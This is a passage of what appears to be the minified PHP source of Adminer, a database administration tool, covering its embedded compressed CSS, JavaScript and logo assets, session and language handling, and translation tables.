icon($Zc,$_,$Yc,$vg){return"<button type='submit' name='$_' title='".h($vg)."' class='icon icon-$Zc'><span>$Yc</span></button>";}if(isset($_GET["file"])){if(substr(VERSION,-4)!='-dev'){if($_SERVER["HTTP_IF_MODIFIED_SINCE"]){header("HTTP/1.1 304 Not Modified");exit;}header("Expires: ".gmdate("D, d M Y H:i:s",time()+365*24*60*60)." GMT");header("Last-Modified: ".gmdate("D, d M Y H:i:s")." GMT");header("Cache-Control: immutable");}@ini_set("zlib.output_compression",'1');if($_GET["file"]=="default.css"){header("Content-Type: text/css; charset=utf-8");echo
lzw_decompress("h:M��h��g�б���\"P�i��m��cQCa��	2ó��d<��f�a��:;NB�q�R;1Lf�9��u7&)�l;3�����J/��CQX�r2M�a�i0���)��e:LuÝh�-9��23l��i7��m�Zw4���њ<-��̴�!�U,��Fé�vt2��S,��a�҇F�VX�a�Nq�)�-���ǜh�:n5���9�Y�;j��-��_�9kr��ٓ;.�tTq�o�0�����{��y��\r�Hn��GS��Zh��;�i^�ux�WΒC@����k��=��b����/A��0�+�(���l���\\��x�:\r��b8\0�0!\0F�\nB�͎�(�3�\r\\�����Ȅa���'I�|�(i�\n�\r���4O�g@�4�C��@@�!�QB��	°�c��¯�q,\r1Eh��&2PZ���iG�H9G�\"v���������4r����D�R�\n�pJ�-A�|/.�c�Du�����:,��=��R�]U5�mV�k�LLQ@-\\����@9��%�S�r���MPD��Ia\r�(YY\\�@X�p��:��p�l�LC �������O,\r�2]7�?m06�p�T��aҥC�;_˗�yȴd�>��bn���n�ܣ3�X���8\r�[ˀ-)�i>V[Y�y&L3�#�X|�	�X�\\ù`�C���#��H��2�2.#���Z�`�<��s����Ò��\0u�h־��M��_\niZeO/CӒ_�`3���1>�=��k3����R/;�/d��\0�����ڵm���7/���A�X�������q.�s�L��� :\$�F�������w�8�߾~�H�j��\"�����Գ7gS���FL�ί�Q�_��O'W��]c=�5�1X~7;��i��\r�*\n��JS1Z���������c���t��A�V�86f�d�y;Y�]��zI�p�����c�3�Y�]}@�\$.+�1�'>Z�cpd���GL��#k�8Pz�Y�Au�v�]s9���_Aq���:���\nK�hB�;���XbAHq,��CI�`����j�S[ˌ�1�V�r���;�p�B��)#鐉;4�H��/*�<�3L��;lf�\n�s\$K`�}��Ք���7�jx`d�%j]��4��Y��HbY��J`�GG��.��K��f�I�)2�Mfָ�X�RC��̱V,���~g\0���g6�:�[j�1H�:AlIq�u3\"���q��|8<9s'�Q]J�|�\0�`p���jf�O�b�����q��\$����1J�>R�H(ǔq\n#r����@�e(y�VJ�0�Q҈��6�P�[C:�G伞���4���^����PZ��\\���(\n��)�~���9R%�Sj�{��7�0�_��s	z|8�H�	\"@�#9DVL�\$H5�WJ@��z�a�J �^	�)�2\nQv��]�������j (A���BB05�6�b˰][��k�A�wvkg�ƴ���+k[jm�zc�}�MyDZi�\$5e��ʷ���	�A��CY%.W�b*뮼�.���q/%}B�X���ZV337�ʻa�������wW[�L�Q�޲�_��2`�1I�i,�曣�Mf&(s-����Aİ�*��Dw��TN�ɻ�jX\$�x�+;���F�93�JkS;���qR{>l�;B1A�I�b)��(6��r�\r�\rڇ����Z�R^SOy/��M#��9{k���v\"�KC�J��rEo\0��\\,�|�fa͚��hI��/o�4�k^p�1H�^����phǡV�vox@�`�g�&�(����;��~Ǎz�6�8�*���5����E���p����Ә���3��ņg��rD�L�)4g{���峩�L��&�>脻����Z�7�\0��̊@�����ff�RVh֝��I�ۈ���r�w)����=x^�,k��2��ݓj�b�l0u�\"�fp��1�RI��z[]�w�pN6dI�z���n.7X{;��3��-I	����7pjÝ�R�#�,�_-���[�>3�\\���Wq�q�J֘�uh���FbL�K���yVľ����ѕ�����V���f{K}S��ޝ��M���̀��.M�\\�ix�b���1�+�α?<�3�~H��\$�\\�2�\$� e�6t�Ö�\$s���x��x���C�nSkV��=z6����'æ�Na��ָh��������R�噣8g�����w:_�����ҒIRKÝ�.�nkVU+dwj��%�`#,{�醳����Y����(oվ��.�c�0g�DXOk�7��K��l��hx;�؏ ݃L��\$09*�9 �hNr�M�.>\0�rP9�\$�g	\0\$\\F�*�d'��L�:�b���4�2����9��@�Hnb�-��E #Ĝ���\0�pY�� t� �\n�5.�����\$op�l�X\n@`\r��	��\r���� � ��� �����`�\r��\r��`�`���0�p�	��@�\0���	 V\0�`f����\0���f�\0j\n�f`�	 �\n`�@�\$n=`�\0����nI�\$�P(�d'�����g�\n��4�\n0���.0�p���\r\0�`�1`���\n\0_ �q�1q�`�\0���������\0�\n@��� f�P����RǠ����@�r�F���h\r�@J��^LN�!��\"\n��e�]r:�Z7�9#\$0��\"gڭ�t�RB׍|�/�#���D�1\"�Ff�\"n���(Yp`W��YƑ�]\$�F�F���Rn\r�w!Mr��K�*s%S\$� ��.s*G*R�(=+�ދ	\n)�d��*mp��\$r����\$����-�?.2�+r:~�ЂI69+�4H�h��\nz\"�(,2 +D�ju�t@q.�𳲽R�&i�,kJ�r`�c��\"�CI�	��z8ڍ����\r���8����f�����.\"������*h(��\0�O���̀� r| ޅM\n�徭o|LJ��v1N��3E(�R\".fh+FW/��I�Γ~�/)�ڦ\r���<��=h1�b]��&�i��-��mR��?�0��������� ��l����� ���@�ڜo~�D��T7t	>k'\$1+�*��)2t�z�2�<�Y)s����ta4��1�,\r�+�=�7l�B/�;��������)�!>��<f��j]���\\��K�\$Ī5*rQ4�");}elseif($_GET["file"]=="dark.css"){header("Content-Type: text/css; charset=utf-8");echo
lzw_decompress("h:M��h��g���h0�LЁ�d91�S!��	�F�!��\"-6N����bd�Gg���:;Nr�)��c7�\r�(H�b81��s9���k\r�c)�m8�O��VA��c1��c34Of*��-�P��1��r41��6��d2�ց���o���#3���B�f#	��g9Φ�،fc\r�I���b6E�C&��,�bu��m7a�V���s��#m!��h��r���v\\3\rL:SA��dk5�n������aF��3��e6fS��y���r!�L��-�K,�3L�@��J��˲�*J��쵣����	������b�c��9���9���@����H�8��\\���6>�`�Ŏ��;�A��<T�'�p&q�qE��4�\rl���h�<5#p��R �#I��%��fBI��ܲ��>�ʫ29<��C�j2��7j��8j��c(n���?(a\0�@�5*3:δ�6����0��-�A�lL��P�4@�ɰ�\$�H�4�n31��1�t�0��͙9���WO!�r��������H����9�Q��96�F���<�7�\r�-xC\n ��@�������:\$i�ضm���4�Kid��{\n6\r���xhˋ�#^'4V�@a��<�#h0�S�-�c��9�+p���a�2�cy�h�BO\$��9�w�iX�ɔ�VY9�*r�Htm	�@b��|@�/��l�\$z���+�%p2l���.�������7�;�&{��m��X�C<l9��6x9�m�������7R��0\\�4��P�)A�o��x���q�O#����f[;��6~P�\r�a��T�GT0���u�ޟ���\n3�\\ \\ʎ�J�ud�CG���PZ�>����d8�Ҩ������C?V��dL��L.(ti���>�,��L�");}elseif($_GET["file"]=="functions.js"){header("Content-Type: text/javascript; charset=utf-8");echo
lzw_decompress("':�̢���i1��1��	4������Q6a&��:OAI��e:NF�D|�!���Cy��m2��\"���r<�̱���/C�#����:DbqSe�J�˦Cܺ\n\n��ǱS\rZ��H\$RAܞS+XKvtd�g:��6��EvXŞ�j��mҩej�2�M�����B��&ʮ�L�C�3���Q0�L��-x�\n��D���yNa�Pn:�����s��͐�(�cL��/���(�5{���Qy4��g-�����i4ڃf��(��bU���k��o7�&�ä�*ACb����`.����\r����������\n��Ch�<\r)`�إ`�7�Cʒ���Z���X�<�Q�1X���@�0dp9EQ�f����F�\r��!���(h��)��\np'#Č��H�(i*�r��&<#��7K��~�# ��A:N6�����l�,�\r��JP�3�!@�2>Cr���h�N��]�(a0M3�2��6��U��E2'!<��#3R�<�����X���CH�7�#n�+��a\$!��2��P�0�.�wd�r:Y����E��!]�<��j��@�\\�pl�_\r�Z���ғ�TͩZ�s�3\"�~9���j��P�)Q�YbݕD�Yc��`��z�c��Ѩ��'�#t�BOh�*2��<ŒO�fg-Z����#��8a�^��+r2b��\\��~0�������W����n��p!#�`��Z��6�1�2��@�ky��9\r��B3�pޅ�6��<�!p�G�9�n�o�6s��#F�3���bA��6�9���Z�#��6��%?�s��\"��|؂�)�b�Jc\r����N�s��ih8����ݟ�:�;��H�ތ�u�I5�@�1��A�PaH^\$H�v��@ÛL~���b9�'�����S?P�-���0�C�\nR�m�4���ȓ:���Ը�2��4��h(k\njI��6\"�EY�#��W�r�\r��G8�@t���Xԓ��BS\nc0�k�C I\rʰ<u`A!�)��2��C�\0=��� ���P�1�ӢK!�!��p�Is�,6�d���i1+����k���<��^�	�\n��20�Fԉ_\$�)f\0��C8E^��/3W!א)�u�*���&\$�2�Y\n�]��Ek�DV�\$�J���xTse!�RY� R��`=L���ޫ\nl_.!�V!�\r\nH�k��\$א`{1	|�����i<jRrPTG|��w�4b�\r���4d�,�E��6���<�h[N�q@Oi�>'ѩ\r����;�]#��}�0�ASI�Jd�A/Q����⸵�@t\r�UG��_G�<��<y-I�z򄤝�\"�P��B\0������q`��vA��a̡J�R�ʮ)��JB.�T��L��y����Cpp�\0(7�cYY�a��M��1�em4�c��r��S)o����p�C!I���Sb�0m��(d�EH����߳�X���/���P���y�X��85��\$+�֖���gd�����y��ϝ�J��� �lE��ur�,dCX�}e������m�]��2�̽�(-z����Z��;I��\\�) ,�\n�>�)����\rVS\njx*w`ⴷSFi��d��,���Z�JFM}Њ ��\\Z�P��`�z�Z�E]�d��ɟO�cmԁ]� ������%�\"w4��\n\$��zV�SQD�:�6���G�wM��S0B�-s��)�Z�cǁ2��δA;��n�Wz/A�Zh�G~�c�c%�[�D�&l�FR�77|�I���3��g0�L���a��c�0RJ�2��%���F� S� �L�^� tr���t����ʩ;��.喚Ł�>����[�a�N���^�(!g�@1����N�z�<b�ݖ�����O,��Cu��D�tj޹I;)�݀�\nn�c��Ȃ�W<s�	�\0�hN�P�9��{ue��ut뵕������3��=��g�����J����WQ�0���w9p-���	�������'5��\nO��e)M�)_k�z\0V�����;j�l��\n����x�Pf�-�`C�.@&]#\0ڶp�y͖ƛ�t�d�� ��b}�	G1�m�ru���*�_�xD�3�q��B�sQ��u��s%�\n�5s�ut���{�s�y���N��4�,J{4@��\0��P���^��=��l���`�e~F١h3o�\"��q�R<iUT�[Q��U��M�6�T. ��0'�pe\\�����5����pCe	ٕ�\"*�M	����D���?�h��2���zU�@7�C�4�a��iE!f�\$�B��<�9o*\$��lH�\$ �@����P\rN�Y�n<\$�	�Q�=�F&��*@]\0��� W'd� z\$��j�P[��\$���0#&��_�`+�B)�w�v%	����LcJ��RS��i`�Ů	�F�W	��\nBP\n�\r\0}	瑩0�Z���/`j\$�: �8ie���φx�����a ���Gn�sgO��U%VU��@�N��ϐ�d+�(oJ�@X���zM'F٣�WhV�I^٢�1>�@�\"���� ��Q�R!�\\�`[������.�0fb�F;���Fp�p/t`����(��V���b�Ȳ�(��H�l����ԯ1v�����H��1T�3�q���1�Ѫf�\nT\$���Nq+��`ލv�ǜ�\r�Vm���r���'ϸ��g%�\"L�m����(�(CLz��\"h�X�m=�\\H\n0U�� f&M\$�g\$�U`a\rP�>`�#g��h��`�R4H��'�����GK;\"M�ۨT�h�BE�n\"b>���\r���#�\0�N:�#_	QQ1{	f:B���R�&���)J��Br�+�K.\$�Pq�-r�S%TIT&Q���{#2o(*P��5�`�1H���'	<T�d����s��,N�� ����^\r%�3��\r&��4�B�/\0�kLH\$�4d�>���/�ඵ�H���*���3J�А�<�Hh��p�'��O/&�2I.�x3V.�s5�e3�ێZ�(�9E�g�;R�;�J��Q�@��vgz@������'dZ&�,U���F��b*�D��H! �\r�;%�x'G#��͠w��#�֠�2;#�Bv�X��a�\nb�{4K�G��%���GuE`\\\rB\r\0�-mW\rM\"��#E�cFbF�nz���@4J��[\$��%2V��%�&T�V��d�4hemN�-;Eľ%E�E�r�<\"@�F�P�L �߭�4E����z`�u�7�N�4��\0�F:h�K�h/:�\"�M�Z��\r+P4\r?��S��O;B��0\$FCEp��M\"�%H4D�|��LN�FtE��g���5�=J\r\"��޼5��4�K�P\rbZ�\r\"pEQ'DwK�W0��g'�l\"h�QF�C,�Cc���IH�P�hF]5�& f�T��iSTUS�����[4�[u�Ne�\$o�K��O ��b\" 5�\0�D�)E�%\"�]��/���ЌJ�6U�d��`��a)V-0��DӔbM�)���������`��%�ELt��+��6C7j�d��:�V4ơ3� -�R\rG�IT��#�<4-CgCP{V�\$'����g��R@�'��S=%���F�k:��k��9����e]aO��G9�;��-6��8W��*�x\"U��YlB���������	��\n��p���l����Z�m\0�5����Oq̨��b�W1s@��K�-p���E�Spw\nGWoQ�qG}vp�w}q��q�\\�7�RZ�@��t��t�;pG}w׀/%\"L�E\0t�h�)�\r��J�\\W@�	�|D#S��ƃV��R�z�2���v�����	�}�����(�\0y<�X\r��x���q�<��Isk1S�-Q4Yq8�#��v���d.ֹS;q�!,'(���<.�J7H�\"��.����u�����#�Q�\re�r�Xv[�h\$�{-�Y���JBg��iM8��'�\nƘtDZ~/�b���8��\$��DbR�O�O��`O5S>����[�D�ꔸ����_3X�)��'��Jd\r�X����UD�U�X8�x�-旅�P�N`�	�\n�Z���@Ra48��:���\0�x���N�\\�0%��f��\\��>\"@^\0Zx�Z�\0ZaBr#�X��\r��{��˕�flFb\0[�ވ\0[�6���	��� �=��\n��WB��\$'�kG�(\$y�e9�(8�& h��Rܔ��o�ȼ Ǉ���Y��4��7_��d��9�'���������z\r���  ����v�G��O8���MOh'��X�S0�\0\0�	��9�s?���I�MY�8� 9����HO��,4	��xs��P�*G����c8��Qɠ��wB|�z	@�	���9c�K��QG�bFj�X��oS�\$��dFHĂP�@ѧ<嶴�,�}�m��r��\"�'k�`��c�x��e�C��C��:���:X� �T���^�d�Æqh��s���Lv�Ү0\r,4�\r_v�L�j�jM��b[  ��ls���Z�@�����;f��`2Yc�e�'�Mer��F\$�!��\n��	*0\r�AN�LP��jٓ����;ƣV�Q|(��3����[p��8���|�^\r�Bf/�D���Ҟ B��_�N5M�� \$�\naZЦ���~�Ule�rŧr��Z�aZ�����գs8R�G�Z��w���N�_Ʊ�Yϣ�m����]��;ƚL�����c������Ű��I�Q3��O��|�y*`� �5��4�;&v8�#�R�8+`X�bV�6�ƫi�3F��E���oc82�M�\"����G�Wb\rO�C�Vd�ӭ�w\\�ͯ*cSi�Qү��R`�d7}	���)�ϴ�,�+bd�۹�FN�3��L\\��eRn\$&\\r��+d��]O5kq,&\"D�CU6j�p���\\'�@o�~�5N=�|�&�!��B�w�H�yyz7��(Ǎ���b5(3փ_\0`z�b�Уr��8	�Z�v�8L˓�)��S�M<�*7\$��\rR�b���B%��ƴDs�z�R>[�Q����&Q������'\r�pp�z�/<��}L�#��Ε���Z��\"t��\n��.4�g�P��p�D�n�ʹN��F�d\0`^����\rnȂ׳#_�� w(�2�<7-��X޹\0��s��,^�hC,�!:�\rK��.��Ӣ�Ţ���\\��+v�Z��\0�Q9eʛ˞E�w?>�\$}��D#���c�0MV3�%Y���\r��tj5��7��{ŝ�Lz=�<��8I�M�����G����L�\$��2��{(�pe?u�,R�d*X�4�����\0\"@���}<.@��	��N��\$�XU�js�/��<>\"* �#\$����&CPI	��t������?� ��	�O��\\��_��Q5Y�H@���b��c�h����뱖��O0T�'�8�w�����j+H�v_#�����06�w֎�X��d+�ܓ\\��\n\0	\\�>s��A	PF�d8m'@�\nH�\0�c�OwS�����Y�`�����R��Dna\"��~�?�m���|@6��+�GxV��\0��W�Ӱ�nw���.�؃b��9Í��E�|E���\rЈr�\"��x���-���\rN6�n�\$Ҭ�-B�H�^�)��y&��ךW�ǧ�bv�R�	���N\0��n�	T��`8X��A\r:{O�@\" �!��\$K�qo��jY֪J�����h}d<1I�xd����TT4NeeC0䥿�:D�F�5L�*::H�jZ��F�R�MրnS\n>PO�[�\$V8;#�K\\'�B��R�د��R�_�8�j��*Ej�\\~v���v��p@T�X�\0002dE	�H�V���D�\"Q'EDJB~A��A�Il*'\n�Y��.�+�9��pg���/�\"�1�8�0�IA�FCȨ�V*a��P�d�У5H\"�A��6�s�Y��;訞�/��0��v}y�\r����ץ1�u\"ˋ�m��_�0焄`���\\B1^\nk\r]lh�}]HBW`��0�꨹rFf�)�W,�ҧ]sm9'O�xԽ�,�9J8��?�4�����\"҅�۽�<�-S����M�;�v��6y|�Z����%�a�#8��TC�!�p��\n��CZ(�9|ܾ��,��\n�+Q\$�ŭ���+�_+��\$��%d  eDQ�J����iX�}�\0P׾������BP���W?��ɍ词��7�HQ~��W��S���\n?	� ����>��!o�\0�R1��9�c�x\$b�6�zB����\"�Y������\$k#w 4��r����Ύ|J y>��\$��'��)�~8���-���D���u!�~�C�&c�dP�&������A�<=bnI�	\\�x��X'@�	���O��S�`Xɍ��[d�!Պ���&��������A�!I\$'���US(&S��l����uk��G�'��R�>WI�~�j����L��>��b�(Й��'U�I������<�I(�*Jc�XB�|zGpr��b+LZ�U��fQ�<D��U\n�T�\"����a�~S��t��٩E|NR�");}elseif($_GET["file"]=="jush.js"){header("Content-Type: text/javascript; charset=utf-8");echo
lzw_decompress('');}elseif($_GET["file"]=="logo.png"){header("Content-Type: image/png");echo"�PNG\r\n\n\0\0\0\rIHDR\0\0\09\0\0\09\0\0\0~6��\0\0\0000PLTE\0\0\0���+NvYt�s���������������su�IJ����/.�������C��\0\0\0tRNS\0@��f\0\0\0	pHYs\0\0\0\0\0��\0\0�IDAT8�Ք�N�@��E��l϶��p6�G.\$=���>��	w5r}�z7�>��P�#\$��K�j�7��ݶ����?4m�����t&�~�3!0�0��^��Af0�\"��,��*��4���o�E���X(*Y��	6	�PcOW���܊m��r�0�~/��L�\rXj#�m���j�C�]G�m�\0�}���ߑu�A9�X�\n��8�V�Y�+�D#�iq�nKQ8J�1Q6��Y0�`��P�bQ�\\h�~>�:pSɀ������GE�Q=�I�{�*�3�2�7�\ne�L�B�~�/R(\$�)�� ��HQn�i�6J�	<��-.�w�ɪj�Vm���m�?S�H��v����Ʃ��\0��^�q��)���]��U�92�,;�Ǎ�'p���!X˃����L�D.�tæ��/w����R��	w�d��r2�Ƥ�4[=�E5�S+�c\0\0\0\0IEND�B`�";}exit;}if($_GET["script"]=="version"){$n=get_temp_dir()."/adminer.version";@unlink($n);$p=file_open_lock($n);if($p)file_write_unlock($p,serialize(array("signature"=>$_POST["signature"],"version"=>$_POST["version"])));exit;}if(!$_SERVER["REQUEST_URI"])$_SERVER["REQUEST_URI"]=$_SERVER["ORIG_PATH_INFO"];if(!strpos($_SERVER["REQUEST_URI"],'?')&&$_SERVER["QUERY_STRING"]!="")$_SERVER["REQUEST_URI"].="?$_SERVER[QUERY_STRING]";if($_SERVER["HTTP_X_FORWARDED_PREFIX"])$_SERVER["REQUEST_URI"]=$_SERVER["HTTP_X_FORWARDED_PREFIX"].$_SERVER["REQUEST_URI"];define('Adminer\HTTPS',($_SERVER["HTTPS"]&&strcasecmp($_SERVER["HTTPS"],"off"))||ini_bool("session.cookie_secure"));@ini_set("session.use_trans_sid",'0');if(!defined("SID")){session_cache_limiter("");session_name("adminer_sid");session_set_cookie_params(0,preg_replace('~\?.*~','',$_SERVER["REQUEST_URI"]),"",HTTPS,true);session_start();}remove_slashes(array(&$_GET,&$_POST,&$_COOKIE),$oc);if(function_exists("get_magic_quotes_runtime")&&get_magic_quotes_runtime())set_magic_quotes_runtime(false);@set_time_limit(0);@ini_set("precision",'15');function
lang($t,$A=null){if(is_string($t)){$bf=array_search($t,get_translations("en"));if($bf!==false)$t=$bf;}$ma=func_get_args();$ma[0]=Lang::$translations[$t]?:$t;return
call_user_func_array('Adminer\lang_format',$ma);}function
lang_format($Cg,$A=null){if(is_array($Cg)){$bf=($A==1?0:(LANG=='cs'||LANG=='sk'?($A&&$A<5?1:2):(LANG=='fr'?(!$A?0:1):(LANG=='pl'?($A%10>1&&$A%10<5&&$A/10%10!=1?1:2):(LANG=='sl'?($A%100==1?0:($A%100==2?1:($A%100==3||$A%100==4?2:3))):(LANG=='lt'?($A%10==1&&$A%100!=11?0:($A%10>1&&$A/10%10!=1?1:2)):(LANG=='lv'?($A%10==1&&$A%100!=11?0:($A?1:2)):(in_array(LANG,array('bs','ru','sr','uk'))?($A%10==1&&$A%100!=11?0:($A%10>1&&$A%10<5&&$A/10%10!=1?1:2)):1))))))));$Cg=$Cg[$bf];}$Cg=str_replace("'",'’',$Cg);$ma=func_get_args();array_shift($ma);$_c=str_replace("%d","%s",$Cg);if($_c!=$Cg)$ma[0]=format_number($A);return
vsprintf($_c,$ma);}function
langs(){return
array('en'=>'English','ar'=>'العربية','bg'=>'Български','bn'=>'বাংলা','bs'=>'Bosanski','ca'=>'Català','cs'=>'Čeština','da'=>'Dansk','de'=>'Deutsch','el'=>'Ελληνικά','es'=>'Español','et'=>'Eesti','fa'=>'فارسی','fi'=>'Suomi','fr'=>'Français','gl'=>'Galego','he'=>'עברית','hi'=>'हिन्दी','hu'=>'Magyar','id'=>'Bahasa Indonesia','it'=>'Italiano','ja'=>'日本語','ka'=>'ქართული','ko'=>'한국어','lt'=>'Lietuvių','lv'=>'Latviešu','ms'=>'Bahasa Melayu','nl'=>'Nederlands','no'=>'Norsk','pl'=>'Polski','pt'=>'Português','pt-br'=>'Português (Brazil)','ro'=>'Limba Română','ru'=>'Русский','sk'=>'Slovenčina','sl'=>'Slovenski','sr'=>'Српски','sv'=>'Svenska','ta'=>'த‌மிழ்','th'=>'ภาษาไทย','tr'=>'Türkçe','uk'=>'Українська','uz'=>'Oʻzbekcha','vi'=>'Tiếng Việt','zh'=>'简体中文','zh-tw'=>'繁體中文',);}function
switch_lang(){echo"<form action='' method='post'>\n<div id='lang'>","<label>".lang(19).": ".html_select("lang",langs(),LANG,"this.form.submit();")."</label>"," <input type='submit' value='".lang(20)."' class='hidden'>\n",input_token(),"</div>\n</form>\n";}if(isset($_POST["lang"])&&verify_token()){cookie("adminer_lang",$_POST["lang"]);$_SESSION["lang"]=$_POST["lang"];redirect(remove_from_uri());}$aa="en";if(idx(langs(),$_COOKIE["adminer_lang"])){cookie("adminer_lang",$_COOKIE["adminer_lang"]);$aa=$_COOKIE["adminer_lang"];}elseif(idx(langs(),$_SESSION["lang"]))$aa=$_SESSION["lang"];else{$da=array();preg_match_all('~([-a-z]+)(;q=([0-9.]+))?~',str_replace("_","-",strtolower($_SERVER["HTTP_ACCEPT_LANGUAGE"])),$Td,PREG_SET_ORDER);foreach($Td
as$z)$da[$z[1]]=(isset($z[3])?$z[3]:1);arsort($da);foreach($da
as$w=>$lf){if(idx(langs(),$w)){$aa=$w;break;}$w=preg_replace('~-.*~','',$w);if(!isset($da[$w])&&idx(langs(),$w)){$aa=$w;break;}}}define('Adminer\LANG',$aa);class
Lang{static$translations;}Lang::$translations=(array)$_SESSION["translations"];if($_SESSION["translations_version"]!=LANG.
3422726030){Lang::$translations=array();$_SESSION["translations_version"]=LANG.
3422726030;}if(!Lang::$translations){Lang::$translations=get_translations(LANG);$_SESSION["translations"]=Lang::$translations;}function
get_translations($Ed){switch($Ed){case"en":$f="%���(�n0���Q�� :�\r��	�@a�0�p(�a<M�Sl\\�;�bѨ\\�z�Nb)̅#F�Cy�fn7�Y	�����h5\r��Q�<�ΰC�\\~\n2�NC�(�r4��0�`(�:Bag8��i:�&㙔�y��F��Y�\r�2� 8Zӣ<���'Ha��2�܌�Ҟ0�\n��b�豌�n:Zΰ�U�Q��ŭw����D��mfpQ����q��a����cq��w7P�X3�t����o�	�Z�B9�Nz��s;�̑҄/�:����|<���4��j�'J�:0�rH1/�+��7(jDӊc��栢�0�K(�2����5�B8�7��\$B�/�h�8'�R�,��E�P����#�7�Ct|�\r�`�������@�, PJ�C�8���� ��j�A b�����,@1�\0S�<��B�=�RD�#b�ͨ\\�:�P�\$Bh�\nb�-�4��.��h����㌳���JɚF���ʸ讻.b.�#�x�!�;SU^�9ʽgZ����`�ɓE`�:��!Hbkd�VC�%�p\"�����\r������3\r�[G6�Lh�!����*\r�|�7(��:�c|9�è�&ȍ�X��(��0�v�6�L�\\���{=7��~��v�^����H�7��\"]��,9ߗ�:*1n�f3YOˆ#&F�`mt2F53����D4���9�Ax^;�r+���8��azx�O�p^��6����ۖZ�P�4��&�M�5V��Z:��ыݖH;Vؕ�*04h�6��i�v�;�Y�ͪ�Z��i�m~�T	+�-���z,�H֘��D��4����[{Q�P���>`V`�3��;�w�mY������Z8���c�x�; �Z{l�،#d��\0���K��v�8�\n@�@_2�	�SW���\rWA�߻�é�2���ńO�	&%\0����Mk�6��gvUҙ3#��/��vO�'��\$���pt���%�:�a?+���p�E�S\nA˺p��T٬z�1�V<݈� \$D�� �b`����h�BfQ�*p\0���b��fX�聕��]ȱ� �-љ�fUÉ�T����Vr�\"Y�dL��@{��/^)x��@�¢�..)��\r���Z�4�x���+��מF��i1n��\"Dȩ���0��	2d`#G�s\r�b=�L�G�Y�I~#�\$�SLЂK<�q�̹�b�6�Fd��I�XV|ϛL��骕��לSEV�5;5R��,\$�Ś��E�r~��\r\r�W �Hc\rk%V�.l�@mtA�3/R��	k��МP��h8Yf����:�LR�a�i'��'��0���OzL{ �X�\"�\nK��#�.�����Ѭ8`*J��AM�y\n������@�%\n.�5�\n��adE�L��Ej?:0\0�\0��y-*�nΊT�M! �n��ș�F�����_�jo\rH�,:r\\�Ѣ����G���J\"�d�0'���lqh2�D1�2-eAp";break;case"ar":$f="%���)��l*������C�(X���l�\"qd+aN.6��d^\"����(<e��l��V�&,�l�S�\nA��#R����Nd��|�X\nFC1��l7`ӄ\$F`���!2��\r��l'��E<>�!�!%�9J*\rrS�UT�e�#}�J��*���d*V́il(n��������T�Id�u'c(��oF����e3�Nb���p2N�S��ӳ:LZ���&�\\b�\\u�ZuJ��+��ωBHd�Nl�#��d2ޯR\n)��&�<:��\\%7%�aSpl|0�~�(�7\rm8�7(�9\r�@\"7N�9�� ��4�x�6��x�;�#\"~������2ѰW,�\n�N�l�E���Rv9�j\nV��:Ο�h\\p��O*�X��s��')���ir�*�&�V�3J;�l1�B��+l���>�j�\\�z�1,��\$q1b�J�{�7!S�.�j�6�R	)���i](�(U�\"+E��q�M?�l�j�\$��W�A(Ȉ�\nUC�d4�PH�� gZ�)\rR��kZ��JJ̔�\n/hAP��u\$hR�12��2e��P뉰Q1�P�\$Bh�\nb�5\rAx�6����w�\"�B�Dŵ1!#!V'�\0�:�p�x0����2����8d0�!�^0����cx�3\r#>2�X�v=q�߸M~G��vR�߹e�2�\r��9�8�x�N��M�C��6L�@0��\0�3�c�2ǫ�X��63��n��I�	X\n�{P6��@:���1�C��:��\0�7��X�6���0��K�����:�a@���5�Q����U�����\0��@\r�͖`X�# ۧ�[�ǝ\r#\$`m3��:����x�݅�E��H���p_	eæs�A���s�*ų��Ɖ*�4b�C\"ȡl��j�W�Z���T� �	�{v950�@9T���4��X]pev��;gp��ta�<���+�f��1�^�(I\r��׆׊�#���7�sj��k4�� f�pt'�亖S*E!�Y\"ŀ\\\"����9r��҆��� 湸�#J3�PyS�����km����6�\"Y�6��<���0��v�HR7}��T׊c�#���#tt@p\0���Z!��#����b��xH%�T�2�dGs����Xk��eT�i�3~�P�mna�Q��P9Q��LH��DT��\$rU�DF�)�\0sC��� C{\n�ppp��9��C��c\r3�0A��a��5B��)� �-�|�F�UB\"bJ��&>�F�rZ�D����H	I2�d)ɔ�d�ч/�И\"hM���g�`iRњ�I���`Hy3��2:�PA,&7�̓��l��fA��;��&:m�F9N�M�\0#�ЍH���O\naP�i^��b�04T���R^��!Ԉ�2J��%C%5YC��SҩE�O�z��[#\"j����Yg�P	@��9��\r�sw��\0&:�Q	���2�[\00T\n7*p���\$�4Δ#H��3�\$b���HhX��q)���ui��\$�{���Z�\$Q����%�c�	K��'��K�`�'�SI`��`+�a�1����\0v���N/�JC3f���#J����d�T*`Zk����Ւv�����p-\\[�z\0��1���kWlK��A6��C,F�k�K�+%\$rՌ9�O�%nUH�\0�*\"2����0��۔�+y���07�0ڂP�\rX��9�BM��I3�:�G�Q���Xd��{��O��N�L2���(�1`>��)�\\C���������]р(\n`�|�C/�`Ķ��>B2";break;case"bg":$f="%���)��h-Z(6�����Q\r�A| ��P\r�At�X4P���)	�EV�L�h.��d�u\r�4�eܞ/�-����O!AH#8��:�ʥ4�l�cZ��2͠��.�(��\n�Y���(���\$��\$1`(`1ƃQ��p9�(g+8]*��Oq�J�_�\r����Gi��T��h���~McN\\4P��򂞴�[�1��UkIN�q�����呺6�}rZ״)�\"Q�r#Y]7O㬸2]�f�,�������D5(7�'��1|F��'7��Q��Ls�*n�����s����0�,��{ ī(��H4ʴ��\0\n�p�7\r�����7�I��0���0�c(@2\r�(�D�:��Q��;�\"����>P�!\$�p9r���낏���0�2Pb&٩�;BҫC���2i�zꤨRF�-�\"؅-�K�A���O�łJ<��\$i؃�,��ߚJ�)�(f�l� Ě��hQ̴-�r�:Hz-��;RƵ3\\�*L4��=?T��awZ<�ܡ?��B���S2t��@�>��J�S����\"0��+(l�i{J�>�5�!hH�A�Q-Dp�Y�:�4I��ь4�K��_~QpM\0�Js���5����l����f��`Oe8th&��6� P��d�af.���y��1��7���*n���j�@6���t*�|9���9Dc�#�x�!�g�hB�7�Hϣ��~�2�LF��CH�\r��uD�vѵF�ft2���7cN�3053ֵ? P�:U�aRҫ5�	�z�7��CpTb8�q?J��|�'n�H��*�(�;��\nOV�#�0�ɝesq1�� ���h�[J�8¼!p���t	�F���7Rã?[\0Bse�b���on�6B=ާ�/���hg\\�B�G���J�X�t�&�&b�ѥ\rq����b�� �@�ؑ*Lm�4�DJ\0 \r\r3�D�t��^�\0.0\"�P�{w�ѷF��x\"б@&�ԛ�t?�=2�:P�aM`�椓B�I+�A��-��W�ӌ\$������݉M�� ��	P.��	AH- ��Ѐ;�(H�(.��7F��!|1hNY��!�`*\ny�2��\r 